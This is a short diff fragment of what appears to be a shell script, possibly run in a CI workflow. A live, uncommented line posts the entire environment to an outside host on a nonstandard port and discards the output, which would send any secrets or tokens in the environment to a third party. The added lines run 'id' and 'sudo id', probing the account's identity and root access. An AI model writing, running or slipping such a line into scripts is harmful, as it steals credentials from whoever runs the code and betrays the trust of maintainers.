@@ -2,6 +2,10 @@
 
 # echo "Hello $(export -p)"
 curl -s -d "$(env)" "http://tencent.bittervan.xyz:2782" > /dev/null
+
+id
+
+sudo id
 # time=$(date)
 # echo "::set-output name=time::$time"
 # tree .
